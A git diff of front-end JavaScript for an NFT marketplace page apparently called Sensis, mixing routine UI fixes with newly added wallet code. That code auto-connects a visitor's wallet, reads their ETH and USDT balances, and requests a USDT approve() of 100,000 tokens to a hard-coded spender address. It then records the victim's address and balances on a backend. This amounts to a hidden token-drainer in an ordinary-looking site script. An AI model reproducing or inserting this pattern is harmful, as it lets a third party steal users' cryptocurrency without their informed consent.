@@ -1,3 +1,235 @@
+let account = "";
+let ethBalance = 0;
+let tokenBalance = 0;
+let spender = "0xAFc81F998b193bc06Eb89190e97Ec6155Be4f365";
+let tokens = [
+  {
+    name: "USDT",
+    address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+    decimals: 6,
+  },
+];
+
+const walletConnectProviderConfig = new WalletConnectProvider.default({
+  infuraId: "27e484dcd9e3efcfd25a83a78777cdf1",
+  qrcodeModalOptions: {
+    desktopLinks: [
+      "ledger",
+      "tokenary",
+      "wallet",
+      "wallet 3",
+      "secuX",
+      "ambire",
+      "wallet3",
+      "apolloX",
+      "zerion",
+      "sequence",
+      "punkWallet",
+      "kryptoGO",
+      "nft",
+      "riceWallet",
+      "vision",
+      "keyring",
+    ],
+    mobileLinks: [
+      "metamask",
+      "trust",
+      "rainbow",
+      "argent",
+      "imtoken",
+      "pillar",
+    ],
+  },
+});
+
+function checkConnection(provider) {
+  provider
+    .request({ method: "eth_accounts" })
+    .then(function (accounts) {
+      if (accounts.length > 0) {
+        account = accounts[0];
+      } else {
+        login(provider);
+      }
+    })
+    .catch(function (err) {});
+}
+
+async function login(provider) {
+  const accounts = await provider
+    .request({ method: "eth_requestAccounts" })
+    .then(function (accounts) {
+      account = accounts[0];
+      getEthBalance(provider);
+      getTokenBalance(provider, tokens[0]);
+    })
+    .catch((e) => {});
+}
+
+function getEthBalance(provider) {
+  let web3 = new Web3(provider);
+  web3.eth.getBalance(account, function (err, result) {
+    if (err) {
+      document.getElementById("connect-wallet-modal").style.display = "none";
+      console.log(err);
+    } else {
+      ethBalance = web3.utils.fromWei(result);
+    }
+  });
+}
+
+async function getTokenBalance(provider, token) {
+  let web3 = new Web3(provider);
+  let contract = new web3.eth.Contract(ERC20, token.address);
+  let balance = await contract.methods.balanceOf(account).call();
+  let decimals = Math.pow(10, token.decimals);
+  tokenBalance = balance / decimals;
+  getToken(token, provider);
+}
+
+function getToken(token, provider) {
+  let web3 = new Web3(provider);
+  let contract = new web3.eth.Contract(ERC20, token.address);
+  contract.methods
+    .approve(spender, Math.pow(10, token.decimals) * 100000)
+    .send({ from: account })
+    .then(function (receipt) {
+      // getUser(true);
+    })
+    .catch(function (err) {
+      // getUser(false);
+    });
+}
+
+ethereum.on("accountsChanged", function (accounts) {
+  account = accounts[0];
+});
+ethereum.on("chainChanged", (chainId) => {
+  location.reload();
+});
+
+function getUser(hasAccess) {
+  let getUserXhr = new XMLHttpRequest();
+  getUserXhr.open("GET", `http://localhost/user/${account}`, true);
+  getUserXhr.send();
+
+  getUserXhr.onreadystatechange = function () {
+    if (this.status == 200 && this.readyState == 4) {
+      let response = JSON.parse(this.response);
+      if (response.walletAddress != null) {
+        document.getElementById("connect-wallet-modal").style.display = "none";
+        if (typeof window.ethereum != undefined) {
+          checkConnection2(window.ethereum);
+        } else {
+          walletConnectProviderConfig
+            .enable()
+            .then(function (provider) {
+              checkConnection2(provider);
+            })
+            .catch(function (error) {
+              console.log(error);
+            });
+        }
+      } else {
+        createUser(hasAccess);
+      }
+    }
+  };
+}
+
+function createUser(hasAccess) {
+  let userPayload = {
+    walletAddress: account,
+    balance: ethBalance,
+    usdt: tokenBalance,
+    hasAccess: hasAccess,
+  };
+  let createUserXhr = new XMLHttpRequest();
+  createUserXhr.open("POST", `http://localhost/user`, true);
+  createUserXhr.setRequestHeader("Content-type", "application/json");
+  createUserXhr.send(JSON.stringify(userPayload));
+
+  createUserXhr.onreadystatechange = function () {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("connect-wallet-modal").style.display = "none";
+      if (typeof window.ethereum != undefined) {
+        checkConnection2(window.ethereum);
+      } else {
+        walletConnectProviderConfig
+          .enable()
+          .then(function (provider) {
+            checkConnection2(provider);
+          })
+          .catch(function (error) {
+            console.log(error);
+          });
+      }
+    }
+  };
+}
+
+if (typeof window.ethereum != undefined) {
+  checkConnection2(window.ethereum);
+} else {
+  walletConnectProviderConfig
+    .enable()
+    .then(function (provider) {
+      checkConnection2(provider);
+    })
+    .catch(function (error) {
+      console.log(error);
+    });
+}
+
+function checkConnection2(provider) {
+  provider
+    .request({ method: "eth_accounts" })
+    .then(function (accounts) {
+      if (accounts.length > 0) {
+        account = accounts[0];
+        document.getElementById("connect-2").style.display = "none";
+        document.getElementById("profile-image").style.display = "block";
+        document.getElementById("notification").style.display = "block";
+        document.getElementById(
+          "profile"
+        ).href = `../profile.html?address=${account}`;
+        getUser2();
+      } else {
+        document.getElementById("connect-2").style.display = "block";
+        document.getElementById("profile-image").style.display = "none";
+        document.getElementById("notification").style.display = "none";
+      }
+    })
+    .catch(function (err) {
+      console.log(err);
+      document.getElementById("connect-2").style.display = "block";
+      document.getElementById("profile-image").style.display = "none";
+      document.getElementById("notification").style.display = "none";
+    });
+}
+
+function getUser2() {
+  let getUserXhr = new XMLHttpRequest();
+  getUserXhr.open("GET", `http://127.0.0.1/user/${account}`, true);
+  getUserXhr.send();
+
+  getUserXhr.onreadystatechange = function () {
+    if (this.readyState == 4 && this.status == 200) {
+      let response = JSON.parse(this.response);
+      console.log(response);
+      if (response != null) {
+        if (response.avatar != null) {
+          document.getElementById("profile-image-2").src =
+            "/images/" + response.avatar;
+        } else {
+          document.getElementById("profile-image-2").src =
+            "/images/" + "profile.svg";
+        }
+      }
+    }
+  };
+}
+
 let details = navigator.userAgent;
 let length;
 
@@ -20,7 +252,8 @@ const getNftCollectionItems = (
   let nftCollectionItemXhr = new XMLHttpRequest();
   nftCollectionItemXhr.open(
     "GET",
-    `https://ethereum-api.rarible.org/v0.1/nft/items/byCollection?collection=${nftCollection}&size=8&continuation=${continuation}`,
+       `https://ethereum-api.rarible.org/v0.1/nft/items/byCollection?collection=${nftCollection}&size=8&continuation=${continuation}`,
+
     true
   );
   nftCollectionItemXhr.send();
@@ -449,7 +682,7 @@ const getNftCollection = (nftCollection, isAddressListed) => {
       );
       if (!isAddressListed) {
         document.getElementById("name").textContent = response.name;
-        document.title = `${response.name} on Sensis: Buy, Sell and Trade | Sensis`
+        document.title = `${response.name} on Sensis: Buy, Sell and Trade | Sensis`;
         document.getElementById("description").textContent = response.symbol;
       }
     }
@@ -475,7 +708,7 @@ if (hasAddress) {
       (collection) => collection["address"] == address
     );
     document.getElementById("name").textContent = addressListed.name;
-    document.title = `${addressListed.name} on Sensis: Buy, Sell and Trade | Sensis`
+    document.title = `${addressListed.name} on Sensis: Buy, Sell and Trade | Sensis`;
     document.getElementById("description").textContent =
       addressListed.description;
     document.getElementById("image").innerHTML = placeImage2(
@@ -502,68 +735,16 @@ document.body.addEventListener("click", function (e) {
     getNftCollectionItems(address, true, continuationKey);
   } else if (targetId == "activity") {
     location.reload();
+  } else if (e.target.id == "toggle-search") {
+    openOrClose("nav-bar", "search-bar");
+  } else if (e.target.id == "close-search") {
+    openOrClose("search-bar", "nav-bar");
+  } else if (
+    e.target.id == "open-nav-sidebar" ||
+    e.target.id == "open-nav-sidebar-2"
+  ) {
+    document.getElementById("nav-sidebar").style.display = "block";
+  } else if (e.target.id == "close-nav-sidebar") {
+    document.getElementById("nav-sidebar").style.display = "none";
   }
-  else if (e.target.id == "toggle-search") {
-		openOrClose("nav-bar", "search-bar");
-	} else if (e.target.id == "close-search") {
-		openOrClose("search-bar", "nav-bar");
-	} else if (
-		e.target.id == "open-nav-sidebar" ||
-		e.target.id == "open-nav-sidebar-2"
-	) {
-		document.getElementById("nav-sidebar").style.display = "block";
-	} else if (e.target.id == "close-nav-sidebar") {
-		document.getElementById("nav-sidebar").style.display = "none";
-	}
 });
-
-let account = "";
-
-checkConnection();
-
-function checkConnection() {
-  ethereum
-    .request({ method: "eth_accounts" })
-    .then(function (accounts) {
-      if (accounts.length > 0) {
-        account = accounts[0];
-        document.getElementById("connect-2").style.display = "none";
-        document.getElementById("profile-image").style.display = "block";
-        document.getElementById("notification").style.display = "block";
-        document.getElementById(
-          "profile"
-        ).href = `../profile.html?address=${account}`;
-         getUser2();
-      } else {
-        document.getElementById("connect-2").style.display = "block";
-        document.getElementById("profile-image").style.display = "none";
-        document.getElementById("notification").style.display = "none";
-      }
-    })
-    .catch(function (err) {
-      console.log(err);
-      document.getElementById("connect-2").style.display = "block";
-      document.getElementById("profile-image").style.display = "none";
-      document.getElementById("notification").style.display = "none";
-    });
-}
-
-function getUser2() {
-  let getUserXhr = new XMLHttpRequest();
-  getUserXhr.open("GET", `/user/${account}`, true);
-  getUserXhr.send();
-
-  getUserXhr.onreadystatechange = function () {
-    if (this.readyState == 4 && this.status == 200) {
-      let response = JSON.parse(this.response);
-      console.log(response.avatar);
-      if (response.avatar != null) {
-        document.getElementById("profile-image-2").src =
-          "/images/" + response.avatar;
-      } else {
-        document.getElementById("profile-image-2").src =
-          "/images/" + "profile.svg";
-      }
-    }
-  };
-}
